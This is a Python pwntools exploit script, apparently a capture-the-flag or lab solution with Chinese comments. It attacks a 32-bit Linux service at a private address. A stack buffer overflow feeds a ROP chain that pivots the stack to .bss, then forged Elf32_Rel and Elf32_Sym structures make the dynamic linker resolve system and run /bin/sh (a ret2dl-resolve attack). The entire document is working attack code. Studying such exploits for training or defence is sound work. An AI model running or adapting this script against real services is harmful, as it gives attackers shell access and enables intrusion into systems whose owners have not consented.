#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'i386')

write_got = 0x0804a018				
read_plt = 0x08048310
plt0_addr = 0x08048300
leave_ret = 0x08048482
pop3_ret = 0x08048519
pop_ebp_ret = 0x0804851b
new_stack_addr = 0x0804a500			#bss与got表相邻，_dl_fixup中会降低栈后传参，设置离bss首地址远一点防止参数写入非法地址出错
relplt_addr = 0x080482b0			#.rel.plt的首地址，通过计算首地址和新栈上我们伪造的结构体Elf32_Rel偏移构造reloc_arg
dymsym_addr = 0x080481cc			#.dynsym的首地址，通过计算首地址和新栈上我们伪造的Elf32_Sym结构体偏移构造Elf32_Rel.r_info
dynstr_addr = 0x0804822c			#.dynstr的首地址，通过计算首地址和新栈上我们伪造的函数名字符串system偏移构造Elf32_Sym.st_name

io = remote('172.17.0.2', 10001)

payload = ""
payload += 'A'*140					#padding
payload += p32(read_plt)			#调用read函数往新栈写值，防止leave; retn到新栈后出现ret到地址0上导致出错
payload += p32(pop3_ret)			#read函数返回后从栈上弹出三个参数
payload += p32(0)					#fd = 0
payload += p32(new_stack_addr)		#buf = new_stack_addr
payload += p32(0x400)				#size = 0x400
payload += p32(pop_ebp_ret)			#把新栈顶给ebp，接下来利用leave指令把ebp的值赋给esp
payload += p32(new_stack_addr)		
payload += p32(leave_ret)

io.send(payload)					#此时程序会停在我们使用payload调用的read函数处等待输入数据

sleep(1)

fake_Elf32_Rel_addr = new_stack_addr + 0x50	#在新栈上选择一块空间放伪造的Elf32_Rel结构体，结构体大小为8字节
fake_Elf32_Sym_addr = new_stack_addr + 0x5c	#在伪造的Elf32_Rel结构体后面接上伪造的Elf32_Sym结构体，结构体大小为0x10字节
binsh_addr = new_stack_addr + 0x74			#把/bin/sh\x00字符串放在最后面

fake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr	#计算伪造的reloc_arg

fake_r_info = ((fake_Elf32_Sym_addr - dymsym_addr)/0x10) << 8 | 0x7 #伪造r_info，偏移要计算成下标，除以Elf32_Sym的大小，最后一字节为0x7

fake_st_name = new_stack_addr + 0x6c - dynstr_addr		#伪造的Elf32_Sym结构体后面接上伪造的函数名字符串system

fake_Elf32_Rel_data = ""
fake_Elf32_Rel_data += p32(write_got)					#r_offset = write_got，以免重定位完毕回填got表的时候出现非法内存访问错误
fake_Elf32_Rel_data += p32(fake_r_info)

fake_Elf32_Sym_data = ""
fake_Elf32_Sym_data += p32(fake_st_name)
fake_Elf32_Sym_data += p32(0)							#后面的数据直接套用write函数的Elf32_Sym结构体，具体成员变量含义自行搜索
fake_Elf32_Sym_data += p32(0)
fake_Elf32_Sym_data += p32(0x12)

payload = ""
payload += "AAAA"					#leave = mov esp, ebp; pop ebp，占位用于pop ebp
payload += p32(plt0_addr)			#调用PLT[0]传入参数*link_map并调用_dl_fixup
payload += p32(fake_reloc_arg)		#传入伪造的reloc_arg重定位并返回到system函数
payload += p32(0)					#system函数返回值
payload += p32(binsh_addr)			#/bin/sh字符串地址
payload += "A"*0x3c					#padding
payload += fake_Elf32_Rel_data
payload += "AAAA"
payload += fake_Elf32_Sym_data
payload += "system\x00\x00"
payload += "/bin/sh\x00"

io.send(payload)